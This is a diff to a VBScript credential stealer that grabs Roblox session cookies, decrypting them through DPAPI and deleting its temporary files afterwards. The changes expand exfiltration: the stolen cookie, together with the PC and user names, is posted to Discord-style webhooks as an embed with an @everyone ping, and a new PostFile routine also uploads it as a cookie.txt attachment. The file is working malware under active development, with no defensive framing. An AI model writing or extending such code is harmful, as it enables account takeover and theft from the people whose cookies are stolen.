@@ -45,20 +45,19 @@ Sub GrabRoblox()
     
     If cookie <> lastCookie Then
         lastCookie = cookie
-        Dim t: t = FormatDateTime(Now, 3) ' 3 = hh:mm:ss AM/PM local time
+        Dim t: t = FormatDateTime(Now, 4)
         
-        ' Determine webhook based on first run
-        Dim destWH
+        ' 1. Send the Embed to REGRAB
+        Dim embed: embed = "{""content"":""@everyone"",""embeds"":[{""title"":""Roblox (JSON-DPAPI)"",""description"":""Size: " & Len(cookie) & "\n" & PC & " / " & USER & "\n\n``````\n" & cookie & "\n``````"",""color"":65280,""footer"":{""text"":""Grabbed at " & t & """}}]}"
+        
         If isFirstRun Then
-            destWH = WH_LOGS
+            SendWebhook WH_LOGS, embed
         Else
-            destWH = WH_REGRAB
+            SendWebhook WH_REGRAB, embed
         End If
         
-        ' Flush codeblock formatting so there are no empty dots at the top
-        Dim embed: embed = "{""content"":""@everyone"",""embeds"":[{""title"":""Roblox Cookie Grabbed"",""description"":""``````" & cookie & "``````"",""color"":65280,""footer"":{""text"":""Roblox Tracker • Grabbed at " & t & """}}]}"
-        
-        SendWebhook destWH, embed
+        ' 2. Send the cookie.txt file attachment
+        Call PostFile("cookie.txt", cookie)
     End If
 End Sub
 
@@ -165,6 +164,15 @@ Sub SendWebhook(url, json)
     h.Send json
 End Sub
 
+Sub PostFile(fn, ct)
+    Dim b: b = MkGuid()
+    Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=""file""; filename=""" & fn & """" & vbCrLf & "Content-Type: text/plain" & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
+    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    h.Open "POST", WH_REGRAB, False
+    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
+    h.Send bd
+End Sub
+
 Function ReadFile(path)
     ReadFile = ""
     Dim f: Set f = fso.OpenTextFile(path, 1)
@@ -199,4 +207,9 @@ Function DecryptDPAPI(b64)
     fso.DeleteFile inf, True
     fso.DeleteFile psf, True
     fso.DeleteFile outf, True
+End Function
+
+Function MkGuid()
+    Dim t: Set t = CreateObject("Scriptlet.TypeLib")
+    MkGuid = Mid(t.GUID, 2, 36)
 End Function
